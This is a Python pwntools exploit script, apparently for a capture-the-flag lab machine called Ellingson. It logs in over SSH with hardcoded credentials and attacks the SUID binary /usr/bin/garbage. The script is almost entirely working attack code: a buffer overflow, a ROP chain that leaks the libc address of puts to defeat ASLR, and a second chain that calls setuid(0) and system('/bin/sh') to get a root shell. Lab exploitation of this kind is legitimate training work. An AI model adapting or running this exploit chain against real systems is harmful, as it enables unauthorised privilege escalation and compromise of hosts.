from pwn import *

### Set GDB to open in a new tmux window
### Uncomment the two lines to test it on the local client
# context(terminal=['tmux','new-window'])
# p = gdb.debug('./garbage', 'b main')

### Run exploit through SSH
s = ssh(host = '10.10.10.139', user = 'margo', password = 'iamgod$08')
p = s.process('/usr/bin/garbage')

context(os='linux', arch='amd64')

### Gets to RSP Overwrite found via pattern offset
junk = ("A" * 136).encode()

### Take top value off stack and put into RDI
# RDI address found via 'ropper --search "pop r?i"'
pop_rdi = p64(0x040179b)

# Global offset pointer to libc (puts location) found via 'objdump -D garbage | grep puts'
got_puts = p64(0x404028)
# Location of callc in PLT found via 'objdump -D garbage | grep puts'
plt_puts = p64(0x401050)
# PLT of main found via 'objdump -D garbage | grep main'
plt_main = p64(0x401619)

### These addressess are from Ellingson and if you want to test it locally, change the addresses accordingly
# Libc puts found via 'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts'
libc_puts = p64(0x809c0)
# Libc system found via 'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system'
libc_system = p64(0x4f440)
# Libc setuid found via 'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setuid'
libc_setuid = p64(0xe5970)
# Libc sh found via 'strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh'
libc_sh = p64(0x1b3e9a)

### Gadget to leak addresses - Put GOT->PUTS into RDI, Call puts to print into GOT_PUTS, call main to not crash
gadget_leak = pop_rdi + got_puts + plt_puts + plt_main

p.sendline(junk + gadget_leak)

p.recvuntil("access denied.")
# Getting the memory address
leaked_put = p.recv()[:8].strip().ljust(8, b'\x00')
log.info(f'Leaked Address: {leaked_put.hex()}')

# Calculate offset
offset = u64(leaked_put) - u64(libc_puts)
log.info(f'Offset: {offset}')

# Using offset to find loaded addresses
system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='little')
setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='little')
sh_loc = (u64(libc_sh) + offset).to_bytes(8, byteorder='little')

# Printing output for debug
log.info(f'System: {system_loc.hex()}')
log.info(f'SetUID: {setuid_loc.hex()}')
log.info(f'/bin/sh: {sh_loc.hex()}')

# Gadget to Code Exection
## Put 0 (uid root) into RDI, call SetUID
gadget_rce = pop_rdi + p64(0) + setuid_loc
## Put /bin/sh into RDI, call system()
gadget_rce += pop_rdi + sh_loc + system_loc

p.sendline(junk + gadget_rce)

# Get shell
p.interactive()
